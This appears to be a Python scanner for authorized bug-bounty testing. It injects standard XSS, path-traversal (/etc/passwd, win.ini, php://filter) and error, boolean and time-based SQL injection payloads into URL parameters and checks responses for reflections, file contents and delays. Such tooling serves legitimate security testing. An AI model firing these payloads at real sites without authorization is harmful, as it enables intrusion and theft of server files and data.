#!/usr/bin/env python3
"""
Authorized web vulnerability testing helper (XSS / LFI / SQLi).

Use ONLY against targets you have explicit written authorization to test,
e.g. an active HackerOne / bug bounty program's in-scope assets, or your
own lab. Every finding here is a *candidate* based on heuristic pattern
matching - manually verify (and understand impact) before writing it up.

This tool does NOT attempt WAF/filter evasion or obfuscation. It sends
standard, well-known test payloads and looks for standard indicators.

Install deps:
    pip install requests

Usage:
    python3 vuln_tester.py urls.txt --i-am-authorized \
        --cookie "session=abc123" --checks xss,lfi,sqli

Input file (urls.txt): one URL per line, each with query parameters, e.g.
    https://target.example.com/search?q=test&page=1
    https://target.example.com/profile?user_id=42
"""

import argparse
import concurrent.futures
import json
import re
import sys
import time
import uuid
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests

requests.packages.urllib3.disable_warnings()

# ---------------------------------------------------------------------------
# Payloads / signatures
# ---------------------------------------------------------------------------

XSS_PAYLOAD_TEMPLATES = [
    '<script>alert("{c}")</script>',
    '"><script>alert("{c}")</script>',
    "'><script>alert('{c}')</script>",
    '<img src=x onerror=alert("{c}")>',
    '"><img src=x onerror=alert("{c}")>',
    '<svg onload=alert("{c}")>',
]

LFI_PAYLOADS = [
    '../../../../../../etc/passwd',
    '....//....//....//....//etc/passwd',
    '/etc/passwd',
    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    'php://filter/convert.base64-encode/resource=index',
    '../../../../../../windows/win.ini',
    'C:\\Windows\\win.ini',
]

LFI_INDICATORS = [
    re.compile(r'root:.*:0:0:'),
    re.compile(r'\[fonts\]', re.I),
    re.compile(r'for 16-bit app support', re.I),
]

SQLI_ERROR_PAYLOADS = ["'", '"', "')", '")', "' OR '1'='1", '" OR "1"="1']

SQLI_ERROR_SIGNATURES = [
    re.compile(r'you have an error in your sql syntax', re.I),
    re.compile(r'warning: mysql', re.I),
    re.compile(r'unclosed quotation mark', re.I),
    re.compile(r'quoted string not properly terminated', re.I),
    re.compile(r'pg_query\(\)', re.I),
    re.compile(r'sqlite3\.OperationalError', re.I),
    re.compile(r'ORA-\d{5}', re.I),
    re.compile(r'Microsoft OLE DB Provider for SQL Server', re.I),
    re.compile(r'SQLSTATE\[', re.I),
]

SQLI_BOOL_TRUE = "' OR '1'='1"
SQLI_BOOL_FALSE = "' AND '1'='2"

SQLI_TIME_PAYLOADS = {
    "MySQL": "' OR SLEEP(5)-- -",
    "PostgreSQL": "'; SELECT pg_sleep(5)-- -",
    "MSSQL": "'; WAITFOR DELAY '0:0:5'--",
}

DEFAULT_DELAY = 0.3
TIMEOUT = 12
TIME_THRESHOLD = 4.5  # seconds; payload sleeps for 5s


@dataclass
class Finding:
    vuln_type: str
    url: str
    param: str
    payload: str
    evidence: str

    def to_dict(self):
        return self.__dict__


def inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query[param] = value
    return urlunparse(parsed._replace(query=urlencode(query, safe="/:")))


def get_params(url: str):
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


class VulnTester:
    def __init__(self, session: requests.Session, delay=DEFAULT_DELAY, timeout=TIMEOUT):
        self.session = session
        self.delay = delay
        self.timeout = timeout
        self.findings = []

    def _request(self, url):
        time.sleep(self.delay)
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None

    def test_xss(self, url, param):
        canary = uuid.uuid4().hex[:8]
        for template in XSS_PAYLOAD_TEMPLATES:
            payload = template.format(c=canary)
            resp = self._request(inject_param(url, param, payload))
            if resp is None:
                continue
            if payload in resp.text:
                self.findings.append(Finding("XSS", url, param, payload, "payload reflected unescaped in response body"))
                return

    def test_lfi(self, url, param):
        for payload in LFI_PAYLOADS:
            resp = self._request(inject_param(url, param, payload))
            if resp is None:
                continue
            for pattern in LFI_INDICATORS:
                if pattern.search(resp.text):
                    self.findings.append(Finding("LFI", url, param, payload, f"matched indicator: {pattern.pattern}"))
                    return

    def test_sqli(self, url, param):
        # error-based
        for payload in SQLI_ERROR_PAYLOADS:
            resp = self._request(inject_param(url, param, payload))
            if resp is None:
                continue
            for sig in SQLI_ERROR_SIGNATURES:
                if sig.search(resp.text):
                    self.findings.append(Finding("SQLi-error", url, param, payload, f"db error signature: {sig.pattern}"))
                    return

        # boolean-based blind
        r_true = self._request(inject_param(url, param, SQLI_BOOL_TRUE))
        r_false = self._request(inject_param(url, param, SQLI_BOOL_FALSE))
        if r_true is not None and r_false is not None:
            if (r_true.status_code == r_false.status_code
                    and r_true.text != r_false.text
                    and abs(len(r_true.text) - len(r_false.text)) > 50):
                self.findings.append(Finding(
                    "SQLi-boolean", url, param,
                    f"TRUE={SQLI_BOOL_TRUE} / FALSE={SQLI_BOOL_FALSE}",
                    f"response body length differs ({len(r_true.text)} vs {len(r_false.text)}) - verify manually, could be false positive",
                ))
                return

        # time-based blind
        for dbname, payload in SQLI_TIME_PAYLOADS.items():
            start = time.time()
            resp = self._request(inject_param(url, param, payload))
            elapsed = time.time() - start
            if resp is not None and elapsed >= TIME_THRESHOLD:
                self.findings.append(Finding("SQLi-time", url, param, payload, f"{dbname}-style payload delayed response by {elapsed:.1f}s"))
                return

    def run(self, url, checks):
        for param in get_params(url):
            if "xss" in checks:
                self.test_xss(url, param)
            if "lfi" in checks:
                self.test_lfi(url, param)
            if "sqli" in checks:
                self.test_sqli(url, param)


def load_urls(path):
    with open(path, encoding="utf-8", errors="replace") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def main():
    parser = argparse.ArgumentParser(description="Authorized XSS/LFI/SQLi testing helper (heuristic, non-evasive)")
    parser.add_argument("urls", help="Path to file with target URLs (one per line, each must include query params)")
    parser.add_argument("--checks", default="xss,lfi,sqli", help="Comma-separated subset: xss,lfi,sqli")
    parser.add_argument("--cookie", help="Cookie header value to authenticate as a test account")
    parser.add_argument("--header", action="append", default=[], help="Extra header 'Name: Value' (repeatable)")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between requests in seconds (be a good citizen)")
    parser.add_argument("--concurrency", type=int, default=4)
    parser.add_argument("--output", default="findings.json")
    parser.add_argument(
        "--i-am-authorized",
        action="store_true",
        help="Required: confirms you have explicit permission (e.g. an in-scope bug bounty program) to test these targets",
    )
    args = parser.parse_args()

    if not args.i_am_authorized:
        print(
            "Refusing to run: pass --i-am-authorized to confirm you have explicit "
            "permission (e.g. an active, in-scope HackerOne program) to test these targets.",
            file=sys.stderr,
        )
        sys.exit(1)

    checks = {c.strip().lower() for c in args.checks.split(",")}
    urls = load_urls(args.urls)
    urls_with_params = [u for u in urls if get_params(u)]
    skipped = len(urls) - len(urls_with_params)
    if skipped:
        print(f"[!] Skipping {skipped} URL(s) with no query parameters (nothing to fuzz).", file=sys.stderr)
    if not urls_with_params:
        print("No URLs with query parameters found in input file.", file=sys.stderr)
        sys.exit(1)

    session = requests.Session()
    if args.cookie:
        session.headers["Cookie"] = args.cookie
    for h in args.header:
        name, _, value = h.partition(":")
        session.headers[name.strip()] = value.strip()
    session.headers.setdefault("User-Agent", "Mozilla/5.0 (authorized-security-testing)")

    tester = VulnTester(session, delay=args.delay)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        list(pool.map(lambda u: tester.run(u, checks), urls_with_params))

    with open(args.output, "w") as f:
        json.dump([fnd.to_dict() for fnd in tester.findings], f, indent=2)

    if tester.findings:
        print(f"\n[+] {len(tester.findings)} potential finding(s) - VERIFY MANUALLY before reporting:\n")
        for fnd in tester.findings:
            print(f"  [{fnd.vuln_type}] {fnd.url}  param={fnd.param}")
            print(f"      payload : {fnd.payload}")
            print(f"      evidence: {fnd.evidence}\n")
    else:
        print("\n[-] No findings from this heuristic pass. Absence of a finding is not proof of absence.")

    print(f"Report written to {args.output}")


if __name__ == "__main__":
    main()
